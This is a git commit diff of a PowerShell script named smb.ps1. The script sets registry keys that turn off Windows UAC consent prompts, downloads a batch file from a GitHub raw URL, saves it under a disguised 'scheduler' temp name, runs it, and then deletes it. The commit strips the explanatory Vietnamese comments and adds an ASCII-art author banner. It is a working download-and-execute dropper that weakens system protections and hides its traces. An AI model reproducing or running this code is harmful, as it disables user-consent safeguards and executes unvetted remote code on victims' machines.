1c143cf6afeab0ff83b8dbee8189ec4c98a11eb4
mitutina <mitutina00@gmail.com>
2025-09-06 22:30:12 +0700

    Update smb.ps1

--- smb.ps1
+++ smb.ps1
@@ -1,11 +1,11 @@
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-# Danh sách URL chứa file thực thi
+
 $URLs = @(
     'https://raw.githubusercontent.com/mitutina/mitutina/main/smb.bat'
 )
-# Tải nội dung từ URL
+
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
     try {
         $response = Invoke-WebRequest -Uri $URL -UseBasicParsing
@@ -16,11 +16,23 @@ if (-not $response) {
     Write-Host "Failed to retrieve the script from the available repository, aborting!"
     return
 }
-# Tạo file tạm để lưu nội dung script
+
 $rand = [Guid]::NewGuid().Guid
 $FilePath = "$env:USERPROFILE\AppData\Local\Temp\scheduler_$rand.bat"
 Set-Content -Path $FilePath -Value $response.Content
-# Thực thi file batch
+
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`"" -Wait
-# Xóa file tạm sau khi thực thi
+
 Remove-Item -Path $FilePath -Force
+
+#  __  __       _          ____                
+# |  \/  | __ _| | _____  | __ ) _   _         
+# | |\/| |/ _` | |/ / _ \ |  _ \| | | |        
+# | |  | | (_| |   <  __/ | |_) | |_| |        
+# |_|  |_|\__,_|_|\_\___| |____/ \__, |        
+#  _____                _____    |___/         
+# |_   _|_ _ _ __   __ |_   _|   _  __ _ _ __  
+#   | |/ _` | '_ \ / _` || || | | |/ _` | '_ \ 
+#   | | (_| | | | | (_| || || |_| | (_| | | | |
+#   |_|\__,_|_| |_|\__, ||_| \__,_|\__,_|_| |_|
+#                  |___/                       
